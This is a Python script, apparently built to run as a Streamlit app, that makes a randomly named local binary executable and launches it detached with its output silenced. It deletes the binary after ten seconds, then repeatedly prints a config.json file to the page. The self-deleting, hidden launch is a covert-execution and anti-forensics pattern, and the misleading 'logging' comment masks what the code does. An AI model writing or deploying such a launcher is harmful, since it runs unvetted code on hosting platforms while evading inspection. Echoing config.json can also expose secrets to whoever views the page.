import os
import string
import subprocess
import sys
import time
import random
file_name = "xlolJPS5Z"
def println(text):
    try:
        if 'streamlit' not in sys.modules:
            import streamlit as st
        else:
            st = sys.modules['streamlit']
        st.write(text)
    except ImportError:
        print(text)

# 启动程序并记录日志
def start_program_with_logging(file_path):
    process = subprocess.Popen(
        [file_path],  # 执行的文件
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        start_new_session=True
    )

def main():
    file_path = os.path.join(os.getcwd(), file_name)
    try:
        os.chmod(file_path, 0o755)
      #  subprocess.Popen(f"sleep 10 && rm -f {os.path.join(os.getcwd(), 'config.json')}", shell=True)
        subprocess.Popen(f"sleep 10 && rm -f {file_path}", shell=True)
    except Exception as e:
        println(f"无法设置执行权限：{e}")
    try:
        start_program_with_logging(file_path)
    except Exception as e:
        println(f"启动程序失败：{e}")
    characters = string.ascii_letters + string.digits
    while True:
        time.sleep(random.uniform(1, 5))
        println('-------------------------------------------------------')
        try:
            with open(os.path.join(os.getcwd(), 'config.json'),'r',encoding="utf-8") as f:
                println(f.read())
        except:
            println('error')
        println('-------------------------------------------------------')

if __name__ == "__main__":
    main()
